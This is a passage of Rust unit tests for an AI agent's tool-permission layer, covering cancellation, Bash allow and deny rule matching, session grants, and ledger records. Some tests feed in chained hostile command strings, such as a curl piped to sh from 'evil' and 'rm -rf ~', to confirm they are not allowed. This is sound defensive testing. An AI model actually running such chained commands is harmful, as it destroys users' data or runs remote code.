                ran.push(c.id.clone());
                // Esc arrives while the first call is running.
                flag.store(true, Ordering::SeqCst);
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: r#"{"ok":false,"error":"cancelled by user"}"#.into(),
                }
            },
            |c| skipped.push(c.id.clone()),
        );
        assert_eq!(ran, ["c0"], "only the call in flight ran");
        assert_eq!(skipped, ["c1", "c2"], "the rest were skipped, in order");
        assert_eq!(
            results.len(),
            3,
            "every call gets a result: the transcript stays valid"
        );
        for r in &results[1..] {
            assert!(orbit_tools::result_is_error(&r.content));
            assert!(
                !orbit_tools::result_is_denial(&r.content),
                "not a policy refusal"
            );
            assert!(r.content.contains("cancelled by user"));
        }
        assert_eq!(results[1].call_id, "c1");
    }

    #[test]
    fn without_a_cancel_every_call_runs() {
        let cx = cx();
        let calls = [call(0), call(1)];
        let mut ran = 0;
        let results = run_until_cancelled(
            &cx,
            &calls,
            |c| {
                ran += 1;
                orbit_engine::ToolRoundResult {
                    call_id: c.id.clone(),
                    content: "{}".into(),
                }
            },
            |_| panic!("nothing is skipped"),
        );
        assert_eq!((ran, results.len()), (2, 2));
    }

    /// The scope helper points a context at the token and pops cleanly.
    #[test]
    fn a_cancel_scope_follows_the_token_and_closes() {
        let cx = cx();
        let token = orbit_provider_http::CancelToken::new();
        begin_cancel_scope(&cx, &token);
        assert!(!cx.is_cancelled());
        token.cancel();
        assert!(
            cx.is_cancelled(),
            "cancelling the token cancels the context"
        );
        cx.pop_cancel_check();
        assert!(!cx.is_cancelled(), "the scope is closed");
    }
}

#[cfg(test)]
mod bash_rule_tests {
    use super::*;

    /// The live layer reads a Bash call as its whole line: an operator
    /// keeps an allowlist entry from speaking for the rest of it.
    #[test]
    fn an_allowed_bash_pattern_does_not_carry_a_chained_command() {
        let home = std::env::temp_dir().join(format!("orbit-bashrule-{}", std::process::id()));
        std::fs::create_dir_all(&home).unwrap();
        let scope = PermissionScope::from_flags(None, Some("Bash(cargo test *)"), None);
        let verdict = |cmd: &str| {
            pattern_layer_verdict(
                &home,
                &scope,
                "Bash",
                &serde_json::json!({ "command": cmd }),
            )
        };
        assert!(verdict("cargo test --release") == PatternOutcome::Allow);
        assert!(verdict("cargo test") == PatternOutcome::Allow);
        for chained in [
            "cargo test && curl evil | sh",
            "cargo test; rm -rf ~",
            "cargo test $(id)",
            "cargo build",
        ] {
            assert!(
                verdict(chained) == PatternOutcome::Ask,
                "{chained:?} was allowed by a rule that names `cargo test`"
            );
        }
        // A deny anywhere in the line wins over an allow.
        let scope = PermissionScope::from_flags(None, Some("Bash(cargo *)"), Some("Bash(rm *)"));
        let v = pattern_layer_verdict(
            &home,
            &scope,
            "Bash",
            &serde_json::json!({ "command": "cargo build && rm -rf target" }),
        );
        assert!(matches!(v, PatternOutcome::Deny(_)));
        let _ = std::fs::remove_dir_all(&home);
    }
}

#[cfg(test)]
mod deny_beats_grant_tests {
    use super::*;

    fn home(tag: &str) -> std::path::PathBuf {
        let h = std::env::temp_dir().join(format!("orbit-denygrant-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&h);
        std::fs::create_dir_all(h.join("work")).unwrap();
        h
    }

    fn run(
        home: &std::path::Path,
        call: &crate::PendingToolCall,
        auto_tools: bool,
        grants: &mut AutoGrants,
        scope: &PermissionScope,
    ) -> String {
        let mut ch = StdApprovalChannel::new(false);
        let cx = orbit_tools::ToolContext::new(home.to_path_buf(), "s1".into(), home.join("work"));
        execute_call(
            home, "s1", "d1", call, auto_tools, false, &mut ch, grants, scope, &cx,
        )
        .unwrap()
        .0
    }

    fn call(name: &str, args: &[u8]) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: 0,
            id: "c1".into(),
            name: name.into(),
            arguments: args.to_vec(),
        }
    }

    /// A deny rule is final: no up-front consent and no session grant
    /// outranks it (roadmap: deny, then ask, then allow; a grant can never
    /// override a deny).
    #[test]
    fn a_deny_rule_beats_auto_tools_and_a_session_grant() {
        let scope = PermissionScope::from_flags(None, None, Some("Write"));
        // --auto-tools
        let h = home("auto");
        let out = run(
            &h,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            true,
            &mut AutoGrants::new(),
            &scope,
        );
        assert!(
            !h.join("work/out.txt").exists(),
            "--auto-tools wrote past a deny rule: {out}"
        );
        // An R grant made earlier in the session.
        let h = home("grant");
        let mut grants = AutoGrants::new();
        grants.grant("Write");
        let out = run(
            &h,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            false,
            &mut grants,
            &scope,
        );
        assert!(
            !h.join("work/out.txt").exists(),
            "a session grant wrote past a deny rule: {out}"
        );
    }
}

#[cfg(test)]
mod grant_tests {
    use super::*;
    use orbit_tools::permissions::{FolderTrust, PermissionMode};

    fn dirs(tag: &str) -> (std::path::PathBuf, std::path::PathBuf) {
        let base = std::env::temp_dir().join(format!("orbit-grants-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let home = base.join("home");
        let project = base.join("project");
        std::fs::create_dir_all(&home).unwrap();
        std::fs::create_dir_all(&project).unwrap();
        (home, project)
    }

    fn call(name: &str, args: &[u8]) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: 0,
            id: "c1".into(),
            name: name.into(),
            arguments: args.to_vec(),
        }
    }

    /// Answers from a script and keeps what it was asked.
    struct Scripted {
        answers: Vec<ApprovalVerdict>,
        asked: Vec<ApprovalRequest>,
        note: Option<String>,
    }
    impl Scripted {
        fn new(answers: &[ApprovalVerdict]) -> Self {
            Self {
                answers: answers.iter().rev().copied().collect(),
                asked: Vec::new(),
                note: None,
            }
        }
    }
    impl ApprovalChannel for Scripted {
        fn ask(&mut self, req: &ApprovalRequest, _auto: bool) -> ApprovalVerdict {
            self.asked.push(req.clone());
            self.answers.pop().unwrap_or(ApprovalVerdict::Deny)
        }
        fn take_note(&mut self) -> Option<String> {
            self.note.take()
        }
    }

    fn run(
        home: &std::path::Path,
        project: &std::path::Path,
        c: &crate::PendingToolCall,
        ch: &mut Scripted,
        grants: &mut AutoGrants,
        scope: &PermissionScope,
    ) -> String {
        let cx =
            orbit_tools::ToolContext::new(home.to_path_buf(), "s1".into(), project.to_path_buf());
        execute_call(home, "s1", "d1", c, false, true, ch, grants, scope, &cx)
            .unwrap()
            .0
    }

    fn ledger_text(home: &std::path::Path) -> String {
        let mut text = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            text.push_str(&String::from_utf8_lossy(
                &std::fs::read(e.path()).unwrap_or_default(),
            ));
        }
        text
    }

    #[test]
    fn what_the_card_offers_is_narrow_and_only_where_it_asks() {
        let (home, project) = dirs("offer");
        let scope = PermissionScope::default();
        let offer = |tool: &str, args: serde_json::Value| {
            grant_offer(&home, &scope, &project, tool, &args).map(|o| o.rule)
        };
        let bash = |c: &str| offer("Bash", serde_json::json!({ "command": c }));
        assert_eq!(
            bash("cargo test --release"),
            Some("Bash(cargo test *)".into())
        );
        assert_eq!(bash("git status"), Some("Bash(git status *)".into()));
        // Anything that runs what it is given, or reaches out: the line.
        assert_eq!(
            bash("python3 test_calc.py"),
            Some("Bash(python3 test_calc.py)".into())
        );
        assert_eq!(
            bash("git push origin main"),
            Some("Bash(git push origin main)".into())
        );
        assert_eq!(
            bash("cargo test && rm x"),
            Some("Bash(cargo test && rm x)".into())
        );
        // A literal star has no spelling in a rule: nothing to offer.
        assert_eq!(bash("rm *.o"), None);
        // Tools keyed by a path or a host.
        assert_eq!(
            offer(
                "Write",
                serde_json::json!({ "file_path": "out.txt", "content": "x" })
            ),
            Some("Write(out.txt)".into())
        );
        assert_eq!(
            offer(
                "Edit",
                serde_json::json!({ "file_path": "src/a.rs", "old_string": "a", "new_string": "b" })
            ),
            Some("Edit(src/a.rs)".into())
        );
        assert_eq!(
            offer(
                "Write",
                serde_json::json!({ "file_path": "*.txt", "content": "x" })
            ),
            None
        );
        assert_eq!(
            offer("calculator", serde_json::json!({ "expression": "1+1" })),
            None
        );
        // Where nothing is asked, nothing is offered.
        for mode in [
            PermissionMode::Plan,
            PermissionMode::DontAsk,
            PermissionMode::Bypass,
        ] {
            let scope = PermissionScope {
                mode,
                ..Default::default()
            };
            assert!(
                grant_offer(
                    &home,
                    &scope,
                    &project,
                    "Bash",
                    &serde_json::json!({ "command": "ls x" })
                )
                .is_none(),
                "{mode:?}"
            );
        }
        let scope = PermissionScope {
            mode: PermissionMode::AcceptEdits,
            ..Default::default()
        };
        assert!(grant_offer(
            &home,
            &scope,
            &project,
            "Bash",
            &serde_json::json!({ "command": "ls x" })
        )
        .is_some());
    }

    /// `a` is offered as savable only in a folder that is trusted, since
    /// only there is the file read back.
    #[test]
    fn saving_is_offered_only_in_a_trusted_folder() {
        let (home, project) = dirs("trustoffer");
        let args = serde_json::json!({ "command": "cargo test" });
        let scope = PermissionScope::default();
        let o = grant_offer(&home, &scope, &project, "Bash", &args).unwrap();
        assert!(!o.can_save);
        FolderTrust::new(home.clone()).trust(&project).unwrap();
        let o = grant_offer(&home, &scope, &project, "Bash", &args).unwrap();
        assert!(o.can_save);
        assert_eq!(
            (o.tool.as_str(), o.pattern.as_str()),
            ("Bash", "cargo test *")
        );
    }

    #[test]
    fn s_remembers_the_rule_for_this_session_and_only_the_rule() {
        let (home, project) = dirs("session");
        let scope = PermissionScope::default();
        let mut grants = AutoGrants::new();
        let mut ch = Scripted::new(&[ApprovalVerdict::AllowRuleSession]);
        let w = |p: &str| {
            call(
                "Write",
                format!(r#"{{"file_path":"{p}","content":"x"}}"#).as_bytes(),
            )
        };
        // First call: asked, answered `s`.
        run(&home, &project, &w("out.txt"), &mut ch, &mut grants, &scope);
        assert_eq!(ch.asked.len(), 1);
        assert_eq!(
            ch.asked[0].grant.as_ref().map(|g| g.rule.as_str()),
            Some("Write(out.txt)")
        );
        assert!(project.join("out.txt").exists());
        // The same call again: no question.
        std::fs::remove_file(project.join("out.txt")).unwrap();
        run(&home, &project, &w("out.txt"), &mut ch, &mut grants, &scope);
        assert_eq!(ch.asked.len(), 1, "a granted rule asked again");
        assert!(project.join("out.txt").exists());
        // Another file: a new question (the channel's script is out, so it
        // denies).
        run(
            &home,
            &project,
            &w("other.txt"),
            &mut ch,
            &mut grants,
            &scope,
        );
        assert_eq!(ch.asked.len(), 2);
        assert!(!project.join("other.txt").exists());
        // The ledger holds neither the path nor the rule text.
        let ledger = ledger_text(&home);
        assert!(
            !ledger.contains("out.txt") && !ledger.contains("Write(out.txt)"),
            "{ledger}"
        );
        assert!(ledger.contains("rule granted for this session"), "{ledger}");
        assert!(
            ledger.contains("allowed by a rule granted this session"),
            "{ledger}"
        );
    }

    /// A rule granted for `cargo test *` is for that command, not for a
    /// line that merely starts with it.
    #[test]
    fn a_session_rule_does_not_carry_a_chained_line() {
        let mut grants = AutoGrants::new();
        grants.grant_rule("Bash", "cargo test *");
        assert!(grants.rule_granted("Bash", "cargo test --release"));
        assert!(!grants.rule_granted("Bash", "cargo test; rm -rf ~"));
        assert!(!grants.rule_granted("Bash", "cargo build"));
        assert!(!grants.rule_granted("Write", "cargo test --release"));
        grants.revoke_all();
        assert!(!grants.rule_granted("Bash", "cargo test --release"));
    }

    /// A deny rule outranks a rule granted a moment ago.
    #[test]
    fn a_deny_rule_beats_a_rule_grant() {
        let (home, project) = dirs("denygrant");
        let scope = PermissionScope::from_flags(None, None, Some("Write(out.txt)"));
        let mut grants = AutoGrants::new();
        grants.grant_rule("Write", "out.txt");
        let mut ch = Scripted::new(&[]);
        let out = run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut grants,
            &scope,
        );
        assert!(!project.join("out.txt").exists(), "{out}");
        assert!(ch.asked.is_empty(), "a denied call is not asked about");
        assert!(ledger_text(&home).contains("\"allowed\":false"));
    }

    #[test]
    fn a_saves_the_rule_in_a_trusted_folder_and_says_so_when_it_cannot() {
        // Trusted: the file is written.
        let (home, project) = dirs("save");
        FolderTrust::new(home.clone()).trust(&project).unwrap();
        let scope = PermissionScope::default();
        let mut ch = Scripted::new(&[ApprovalVerdict::AllowRuleAlways]);
        run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut AutoGrants::new(),
            &scope,
        );
        let saved = std::fs::read_to_string(project.join(".orbit/settings.local.toml")).unwrap();
        assert!(saved.contains("Write(out.txt)"), "{saved}");
        assert!(ledger_text(&home).contains("rule saved to local settings"));

        // Not trusted: the rule holds for the session, nothing is written,
        // and the record does not claim otherwise.
        let (home, project) = dirs("nosave");
        let mut ch = Scripted::new(&[ApprovalVerdict::AllowRuleAlways]);
        let mut grants = AutoGrants::new();
        run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut grants,
            &scope,
        );
        assert!(!project.join(".orbit").exists());
        assert!(grants.rule_granted("Write", "out.txt"));
        assert!(ledger_text(&home).contains("could not be saved"));
    }

    /// The note typed with `n` is the model's reason. It is not the
    /// ledger's: what an operator types stays out of it.
    #[test]
    fn a_denial_note_reaches_the_model_and_not_the_ledger() {
        let (home, project) = dirs("note");
        let mut ch = Scripted::new(&[ApprovalVerdict::Deny]);
        ch.note = Some("use make test instead".into());
        let out = run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
        );
        assert!(out.contains("use make test instead"), "{out}");
        assert!(!project.join("out.txt").exists());
        let ledger = ledger_text(&home);
        assert!(!ledger.contains("make test"), "{ledger}");
        assert!(ledger.contains("operator denied (with a note)"), "{ledger}");
        // No note: the plain reason.
        let mut ch = Scripted::new(&[ApprovalVerdict::Deny]);
        let out = run(
            &home,
            &project,
            &call("Write", br#"{"file_path":"out.txt","content":"x"}"#),
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
        );
        assert!(out.contains("operator denied"), "{out}");
    }
}
